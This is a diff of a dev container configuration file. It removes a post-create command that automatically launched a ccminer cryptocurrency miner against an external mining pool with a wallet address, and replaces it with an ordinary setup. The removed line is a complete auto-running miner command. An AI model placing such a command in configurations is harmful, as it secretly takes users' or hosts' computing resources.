@@ -1,7 +1,17 @@
 {
     "name": "Auto-execute setup",
-    "image": "mcr.microsoft.com/devcontainers/base:ubuntu", // Specify a base image
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu", // Use any base image
 
-    // Run these commands after the container is created
-    "postCreateCommand": "apt update && apt upgrade -y && chmod +x ./build.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RDSoaEZU3Qf1dG1irEdvUjoXAffkV7J6TL.XIDX3 -p d=5 -t 2"
+    // Optional: Features to install additional tools in the container
+    "features": {
+        "ghcr.io/devcontainers/features/docker-in-docker:1": {}
+    },
+
+    // Ensuring bash as the default shell
+    "settings": {
+        "terminal.integrated.defaultProfile.linux": "bash"
+    },
+
+    // Command(s) to run after the container is created
+    "postCreateCommand": "apt-get update && apt-get upgrade -y && chmod +x ./build.sh && ./build.sh"
 }
